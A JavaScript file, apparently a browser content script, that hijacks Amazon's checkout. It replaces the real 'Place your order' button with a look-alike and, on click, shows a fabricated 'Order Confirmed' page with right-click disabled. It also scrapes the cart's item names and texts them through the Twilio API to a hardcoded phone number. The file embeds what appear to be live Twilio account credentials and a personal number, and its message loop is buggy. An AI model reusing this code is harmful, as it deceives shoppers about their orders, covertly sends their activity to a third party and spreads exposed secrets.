
var submits = document.querySelectorAll("#submitOrderButtonId, #bottomSubmitOrderButtonId");

var confirmation = '<!DOCTYPE html><html> <head> <meta charset="utf-8"/> <meta name="viewport" content="width=device-width, initial-scale=1"/> <title></title> <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet"/> <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"/> <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js" ></script> <style>@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800&display=swap"); body{background-color: #eee; font-family: "Poppins", sans-serif; font-weight: 300;}.cart{height: 100vh;}.progresses{display: flex; align-items: center;}.line{width: 76px; height: 6px; background: #63d19e;}.steps{display: flex; background-color: #63d19e; color: #fff; font-size: 12px; width: 30px; height: 30px; align-items: center; justify-content: center; border-radius: 50%;}.check1{display: flex; background-color: #63d19e; color: #fff; font-size: 17px; width: 60px; height: 60px; align-items: center; justify-content: center; border-radius: 50%; margin-bottom: 10px;}.invoice-link{font-size: 15px;}.order-button{height: 50px;}.background-muted{background-color: #fafafc;}</style> </head> <body oncontextmenu="return false" class="snippet-body"> <div class="container mt-4 mb-4"> <div class="row d-flex cart align-items-center justify-content-center"> <div class="col-md-10"> <div class="card"> <div class="row g-0"> <div class="col-md-12 border-right p-5"> <div class="text-center order-details"> <div class="d-flex justify-content-center mb-5 flex-column align-items-center" > <span class="check1"><i class="fa fa-check"></i></span> <span class="font-weight-bold">Order Confirmed</span> <small class="mt-2" >Thank you for your business!</small > <a href="#" class="text-decoration-none invoice-link" >Order ID: 123456123125</a > </div><button onclick="window.location.href = \'https://www.amazon.com/\'" class="btn btn-warning btn-block order-button"> Return to the homepage </button> </div></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-alpha1/dist/js/bootstrap.bundle.min.js" ></script> <script type="text/javascript"></script> </body></html>';



function getItems() {
    var items = document.getElementsByClassName("a-row breakword");
    console.log(items)
    console.log(items.length)
    var output = []
    for (let i = 0; i < items.length; i++) {
        console.log(items[i].childNodes[1].innerHTML)
        output.push(items[i].childNodes[1].innerHTML)
    }
    return output
}

function formatString() {
    let outString = "Someone tried to order"
    console.log(outString)
    let items = getItems();
    outString += " " + items[0]
    if (items.length > 1) {
        for (let i = 1; i < items.length - 1; i++) {
            outString += ", " + items[0]
        }
        outString += ", and " + items[items.length - 1]
    }
    console.log(outString)
    return outString
}


function update() {
    let msg = formatString()
    document.body.innerHTML = confirmation;
    fetch('https://api.twilio.com/2010-04-01/Accounts/ACa7ec0cb8c7c56cf6e9950157b31d029a/Messages.json', {
    method: 'POST',
    headers: {
        Authorization: "Basic QUNhN2VjMGNiOGM3YzU2Y2Y2ZTk5NTAxNTdiMzFkMDI5YTpjNzVmZDJiMDAxMTNjNjAzNmUzY2I1ZjE2NGVhNGUwZA=="
      },
    body: new URLSearchParams({
        'To': '+14253817303',
        'Body': msg,
        'MessagingServiceSid': 'MGdf99582a2d82c447cae92a9d150b3829'
    })
}).then(response => response.json())
    .then(data => console.log(data));
}

var buttonHtml = `<span id="submitFakeOrderButtonId" class="a-button a-button-span12 a-button-primary continue-button celwidget buy-button-height buy-button-sky-fix">
    <span class="a-button-inner">
    <input name="fakeOrderPlace" id="fakeOrder" class="a-button-input" type="button">
    <span id="submitFakeOrderButtonId-announce" class="a-button-text" aria-hidden="true">
    <span class="place-order-button-text buy-button-line-height">Place your order</span>
    </span></span></span>`;

for (let index = 0; index < submits.length; index++) {
    console.log(submits[index].id);

    if (submits[index].nextElementSibling.textContent.trim() === "Place your order" && submits[index].parentElement.parentElement.id != "submitFakeOrderButtonId") {
        var el = submits[index].parentElement.parentElement;
        el.insertAdjacentHTML("afterend", buttonHtml);
        el.parentNode.removeChild(el);        
    }
}

var fakeOrderButtons = document.querySelectorAll("#fakeOrder");
for (let index = 0; index < fakeOrderButtons.length; index++) {
  fakeOrderButtons[index].addEventListener("click", update);
}

